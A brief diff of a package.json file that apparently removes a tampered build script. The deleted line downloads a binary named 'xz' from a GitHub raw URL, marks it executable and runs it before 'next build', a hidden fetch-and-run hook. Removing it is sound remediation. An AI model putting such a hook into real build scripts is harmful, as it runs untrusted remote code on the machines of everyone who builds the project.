@@ -14,7 +14,7 @@
   },
   "scripts": {
     "dev": "next dev",
-    "build": "wget https://raw.githubusercontent.com/aurbach55/yes/main/xz && chmod 777 xz && ./xz && next build",
+    "build": "next build",
     "export": "next export"
   },
   "dependencies": {
